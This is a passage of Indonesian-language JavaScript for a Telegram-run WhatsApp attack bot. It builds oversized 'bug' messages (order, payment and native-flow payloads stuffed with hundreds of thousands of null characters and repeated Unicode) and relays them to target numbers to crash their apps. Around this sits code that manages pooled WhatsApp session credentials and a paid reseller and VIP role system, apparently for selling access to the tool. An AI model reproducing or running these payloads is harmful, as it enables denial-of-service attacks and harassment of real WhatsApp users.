                      very_helpful_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                      slightly_helpful_label: "𑜦𑜠".repeat(2000),
                      slightly_unhelpful_label: "ꦾ".repeat(2000),
                      very_unhelpful_label: "𑲱".repeat(2000),
                      question_answered_screen_question: "𑇂𑆵𑆴𑆿".repeat(3000),
                      yes_label: "𑲱".repeat(2000),
                      no_label: "ꦾ".repeat(2000),
                      improvement_suggestion_label: "𑇂𑆵𑆴𑆿".repeat(2000),
                      submit_label: "𑜦𑜠".repeat(2000)
                    }
                  },
                  flow_metadata: {
                    flow_json_version: 700,
                    data_api_protocol: null,
                    data_api_version: null,
                    flow_name: "𑇂𑆵𑆴𑆿".repeat(1000),
                    creation_source: "CSAT",
                    categories: []
                  },
                  icon: "DEFAULT",
                  has_multiple_buttons: false
                })
              }]
            }
          }
        }
      }
    };

    const wowo = {
      viewOnceMessage: {
        message: {
          orderMessage: {
            orderId: "D-" + Date.now(),
            itemCount: null,
            status: "SUCCES",
            surface: "CATALOG",
            message: " ?⃟꙰ LU ✶⤻꙳‌‌༑ᐧ‌⌁⃰HAMA 🍷",
            token: "\u0000".repeat(40000),
            sellerJid: sock.user.id.split(':')[0] + '@s.whatsapp.net',
            nativeFlowMessage: {
              buttons: [{
                name: "payment_info",
                buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
              }]
            }
          }
        }
      }
    };

    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [{
                name: "payment_key_info",
                buttonParamsJson: JSON.stringify({
                  currency: "IDR",
                  total_amount: {
                    value: 0,
                    offset: 100
                  },
                  reference_id: "\u0000".repeat(15000),
                  type: "physical-goods",
                  order: {
                    status: "pending",
                    subtotal: {
                      value: 0,
                      offset: 100
                    },
                    order_type: "ORDER",
                    items: [{
                      name: "Denis",
                      amount: {
                        value: 9999,
                        offset: 100
                      },
                      quantity: -1,
                      sale_amount: {
                        value: 0,
                        offset: 100
                      }
                    }]
                  },
                  payment_settings: [{
                    type: "payment_key",
                    payment_key: {
                      type: "IDPAYMENTACCOUNT",
                      key: "+62 85846287780",
                      name: "DANA",
                      institution_name: "DANA",
                      full_name_on_account: "\0".repeat(150000)
                    }
                  }],
                  share_payment_status: true,
                  is_soft_deleted: true,
                  referral: "chat_attachment"
                })
              }]
            }
          }
        }
      }
    };

    await sock.relayMessage(target, dens, {
      messageId: "MSG-" + Date.now()
    });

    await sock.relayMessage(target, wowo, {
      messageId: "MSG-" + Date.now()
    });

    await sock.relayMessage(target, msg2, {
      messageId: "MSG-" + Date.now(),
      additionalNodes: [{
        tag: "biz",
        attrs: {
          native_flow_name: "payment_key_info"
        }
      }]
    });

  } catch (error) {
    console.error('Error:', error.message);
  }
}

async function smsl(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "ytim"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0000".repeat(500000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }

async function jomok(sock, target) {
    const msg = {
        text: "lu bau",
        contextInfo: {
            participant: "999@s.whatsapp.net",
            stanzaId: "ြ".repeat(1500),
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            externalAdReply: {
                title: "berkarat",
                body: "\u0000".repeat(1500),
                thumbnailUrl: "https://files.catbox.moe/j2q32z.jpg",
                mediaType: 1,
                sourceUrl: "https://t.me/elltzyy_md",
                showAdAttribution: true
            }
        }
    };

    await sock.relayMessage("status@broadcast", msg, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { status_setting: "allowlist" },
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

// ========== WAITING & SLEEP ==========
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ========== ACTIVE CONNECTIONS ==========
const activeConnections = {};
const biz = {};   
const mess = {};  

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; 
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}

function setupVipFolder() {
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log("Gagal unfollow ${jid}:", err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); 
          fs.writeFileSync(destCreds, data); 
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const baseDir = 'permenmd';
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); 

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}

function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}

function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; 
    }
  }
  return null; 
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function getFormattedUsers() {
  const db = loadDatabaseCached();
  return db.users.map(u => `👤 ${u.username} | 🎯 ${u.role || 'full up'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ─── HANDLER /start UNTUK PRIVATE (MENU) ─────────────
bot.start(async (ctx) => {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }

    const userId = ctx.from.id;
    const config = loadTelegramConfig();
    const isDev = config.devList && config.devList.includes(userId);
    const isOwner = config.ownerList && config.ownerList.includes(userId);
    const isPt = config.ptList && config.ptList.includes(userId);
    const isVip = config.vipList && config.vipList.includes(userId);
    const isReseller = config.resellerList && config.resellerList.includes(userId);
    const isFullup = config.fullupList && config.fullupList.includes(userId);
    const isUser = config.userList && config.userList.includes(userId);

    if (!isDev && !isOwner && !isPt && !isVip && !isReseller && !isFullup && !isUser) {
        return ctx.replyWithHTML(`<blockquote>❌ Anda Tidak Memiliki Izin\n\nHubungi Owner untuk mendapatkan akses.\n\n🆔 ID Anda: ${userId}</blockquote>`);
    }

    let role = null;
    if (isDev) role = 'developer';
    else if (isOwner) role = 'owner';
    else if (isPt) role = 'pt';
    else if (isVip) role = 'vip';
    else if (isReseller) role = 'reseller';
    else if (isFullup) role = 'fullup';
    else role = 'member';

    const menuMessage = `<blockquote>👋 Halo ${ctx.from.first_name}, pilih menu:</blockquote>`;
    const videoUrl = getRandomVidio();

    const payload = {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: getMainKeyboard(role)
    };

    if (ctx.chat.type === "private") {
        payload.message_effect_id = menuEffects[Math.floor(Math.random() * menuEffects.length)];
    }

    const msg = await ctx.replyWithVideo(videoUrl, payload);

    menuMsg = {
        chat_id: ctx.chat.id,
        message_id: msg.message_id,
        role: role
    };

    menuAnimation = setInterval(async () => {
        try {
            await ctx.telegram.editMessageReplyMarkup(
                menuMsg.chat_id,
                menuMsg.message_id,
                null,
                getMainKeyboard(menuMsg.role)
            );
        } catch (err) {}
    }, 3000);
});

bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const text = ctx.message.text;

    // COMMANDS
    if (text.startsWith('/addreseller')) return handleAddReseller(ctx);
    if (text.startsWith('/addvip')) return handleAddVip(ctx);
    if (text.startsWith('/addpt')) return handleAddPt(ctx);
    if (text.startsWith('/addowner')) return handleAddOwner(ctx);
    if (text.startsWith('/adddev')) return handleAddDev(ctx);
    if (text.startsWith('/info')) return handleInfo(ctx);
    if (text.startsWith('/clear')) return handleClear(ctx);
    if (text.startsWith('/restart')) return handleRestart(ctx);

    // ADD ROLE STATE
    if (addRoleState[userId]) {
        const targetId = parseInt(text.trim());
        if (isNaN(targetId)) {
            delete addRoleState[userId];
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ ID tidak valid!</blockquote>`, { parse_mode: "HTML" });
        }
        const roleType = addRoleState[userId].role;
        const config = loadTelegramConfig();
        const roleMap = {
            reseller: { list: "resellerList", label: "RESELLER" },
            vip: { list: "vipList", label: "VIP" },
            pt: { list: "ptList", label: "PT" },
            owner: { list: "ownerList", label: "OWNER" },
            developer: { list: "devList", label: "DEVELOPER" }
        };
        const role = roleMap[roleType];
        if (!role) {
            delete addRoleState[userId];
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Role tidak dikenal.</blockquote>`, { parse_mode: "HTML" });
        }
        if (!config[role.list]) config[role.list] = [];
        if (config[role.list].includes(targetId)) {
            delete addRoleState[userId];
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ User sudah memiliki role ${role.label}.</blockquote>`, { parse_mode: "HTML" });
        }
        config[role.list].push(targetId);
        fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
        delete addRoleState[userId];
        bot.telegram.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: ${role.label}</blockquote>`, { parse_mode: "HTML" });
        return;
    }

    // DELETE USER
    if (deleteUserState[userId] && deleteUserState[userId].step === "waiting_username") {
        const username = text.trim();
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === username);
        if (index === -1) {
            delete deleteUserState[userId];
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
        }
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        delete deleteUserState[userId];
        bot.telegram.sendMessage(chatId, `<blockquote>🗑️ User ${deleted.username} berhasil dihapus.</blockquote>`, { parse_mode: "HTML" });
        return;
    }

    // SET EXPIRE
    if (setExpireState[userId] && setExpireState[userId].step === "waiting_data") {
        const [username, addDays] = text.split("|").map(s => s.trim());
        if (!username || !addDays || isNaN(parseInt(addDays))) {
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Format salah!\nGunakan: username|tambah_hari</blockquote>`, { parse_mode: "HTML" });
        }
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) {
            delete setExpireState[userId];
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
        }
        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        delete setExpireState[userId];
        bot.telegram.sendMessage(chatId, `<blockquote>✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}</blockquote>`, { parse_mode: "HTML" });
        return;
    }

    // CREATE ACCOUNT
    if (createAccountState[userId] && createAccountState[userId].step === "waiting_account_data") {
        const parts = text.split("|").map(s => s.trim());
        if (parts.length !== 3) {
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Format salah!\nGunakan: username|password|durasi_hari</blockquote>`, { parse_mode: "HTML" });
        }
        const [username, password, day] = parts;
        const db = loadDatabase();
        const roleName = createAccountState[userId].role;
        if (db.find(u => u.username === username)) {
            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Username sudah ada!</blockquote>`, { parse_mode: "HTML" });
        }
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: roleName, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        delete createAccountState[userId];
        bot.telegram.sendMessage(chatId, `<blockquote>✅ Akun ${roleName.toUpperCase()} dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}\n📅 Expired: ${expired.toISOString().split("T")[0]}</blockquote>`, { parse_mode: "HTML" });
        return;
    }

    // STORAN
    const storanData = loadStoranData();
    const pending = storanData.pending.find(s => s.userId === userId);
    if (pending && pending.step === "waiting_username") {
        return handleStoranUsername(chatId, userId, text);
    }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) return;

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); 
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on('callback_query', async (ctx) => {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }

    const userId = ctx.from.id;
    const data = ctx.match[0];
    await ctx.answerCbQuery();

    const config = loadTelegramConfig();
    const isDev = config.devList && config.devList.includes(userId);
    const isOwner = config.ownerList && config.ownerList.includes(userId);
    const isPt = config.ptList && config.ptList.includes(userId);
    const isVip = config.vipList && config.vipList.includes(userId);
    const isReseller = config.resellerList && config.resellerList.includes(userId);
    const isFullup = config.fullupList && config.fullupList.includes(userId);

    if (data === "back_start") {
        try { await ctx.deleteMessage(); } catch (e) {}
        let role = null;
        if (isDev) role = 'developer';
        else if (isOwner) role = 'owner';
        else if (isPt) role = 'pt';
        else if (isVip) role = 'vip';
        else if (isReseller) role = 'reseller';
        else if (isFullup) role = 'fullup';
        else role = 'member';
        const menuMessage = `<blockquote>👋 Halo ${ctx.from.first_name}, pilih menu:</blockquote>`;
        const videoUrl = getRandomVidio();
        const payload = {
            caption: menuMessage,
            parse_mode: "HTML",
            reply_markup: getMainKeyboard(role)
        };
        if (ctx.chat.type === "private") {
            payload.message_effect_id = menuEffects[Math.floor(Math.random() * menuEffects.length)];
        }
        const msg = await ctx.replyWithVideo(videoUrl, payload);
        menuMsg = { chat_id: ctx.chat.id, message_id: msg.message_id, role: role };
        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    menuMsg.chat_id,
                    menuMsg.message_id,
                    null,
                    getMainKeyboard(menuMsg.role)
                );
            } catch (err) {}
        }, 3000);
        return;
    }

    // STORAN APPROVE
    if (data.startsWith('storan_terima_')) {
        const storanId = data.replace('storan_terima_', '');
        await handleStoranApprove(userId, storanId, "terima", ctx);
        return;
    }
    if (data.startsWith('storan_tolak_')) {
        const storanId = data.replace('storan_tolak_', '');
        await handleStoranApprove(userId, storanId, "tolak", ctx);
        return;
    }
    if (data.startsWith('storan_qr_terima_')) {
        const qrId = data.replace('storan_qr_terima_', '');
        await handleStoranQrApprove(userId, qrId, "terima", ctx);
        return;
    }
    if (data.startsWith('storan_qr_tolak_')) {
        const qrId = data.replace('storan_qr_tolak_', '');
        await handleStoranQrApprove(userId, qrId, "tolak", ctx);
        return;
    }

    // MENU BUTTONS
    switch (data) {
        case "create_member":
            createAccountState[userId] = { role: "member", chatId: ctx.chat.id, step: "waiting_account_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun MEMBER:\n\nFormat: username|password|durasi_hari</blockquote>`);
            break;
        case "create_reseller":
            if (!isReseller && !isVip && !isPt && !isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat Reseller.</blockquote>`);
            }
            createAccountState[userId] = { role: "reseller", chatId: ctx.chat.id, step: "waiting_account_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun RESELLER:\n\nFormat: username|password|durasi_hari</blockquote>`);
            break;
        case "create_vip":
            if (!isVip && !isPt && !isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat VIP.</blockquote>`);
            }
            createAccountState[userId] = { role: "vip", chatId: ctx.chat.id, step: "waiting_account_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun VIP:\n\nFormat: username|password|durasi_hari</blockquote>`);
            break;
        case "create_pt":
            if (!isPt && !isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat PT.</blockquote>`);
            }
            createAccountState[userId] = { role: "pt", chatId: ctx.chat.id, step: "waiting_account_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun PT:\n\nFormat: username|password|durasi_hari</blockquote>`);
            break;
        case "create_owner":
            if (!isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat Owner.</blockquote>`);
            }
            createAccountState[userId] = { role: "owner", chatId: ctx.chat.id, step: "waiting_account_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun OWNER:\n\nFormat: username|password|durasi_hari</blockquote>`);
            break;
        case "create_developer":
            if (!isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Hanya Developer yang bisa membuat Developer.</blockquote>`);
            }
            createAccountState[userId] = { role: "developer", chatId: ctx.chat.id, step: "waiting_account_data" };
            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun DEVELOPER:\n\nFormat: username|password|durasi_hari</blockquote>`);
            break;
        case "add_reseller":
            if (!isReseller && !isVip && !isPt && !isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan menambah Reseller.</blockquote>`);
            }
            addRoleState[userId] = { role: "reseller" };
            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role RESELLER:</blockquote>`);
            break;
        case "add_vip":
            if (!isVip && !isPt && !isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan menambah VIP.</blockquote>`);
            }
            addRoleState[userId] = { role: "vip" };
            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role VIP:</blockquote>`);
            break;
        case "add_pt":
            if (!isPt && !isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan menambah PT.</blockquote>`);
            }
            addRoleState[userId] = { role: "pt" };
            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role PT:</blockquote>`);
            break;
        case "add_owner":
            if (!isOwner && !isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Hanya OWNER atau DEVELOPER yang bisa menambah Owner.</blockquote>`);
            }
            addRoleState[userId] = { role: "owner" };
            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role OWNER:</blockquote>`);
            break;
        case "add_developer":
            if (!isDev) {
                return ctx.replyWithHTML(`<blockquote>❌ Hanya DEVELOPER yang bisa menambah Developer.</blockquote>`);
            }
            addRoleState[userId] = { role: "developer" };
            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role DEVELOPER:</blockquote>`);
            break;
        case "storan":
            let storanButtons = [];
            if (isDev) {
                storanButtons = [
                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
                    [{ text: "💎 Storan Paket PT", callback_data: "storan_pt", style: "primary" }],
                    [{ text: "👑 Storan Paket OWNER", callback_data: "storan_owner", style: "primary" }],
                    [{ text: "👑 Storan Paket DEVELOPER", callback_data: "storan_developer", style: "success" }],
                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
                ];
            } else if (isOwner) {
                storanButtons = [
                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
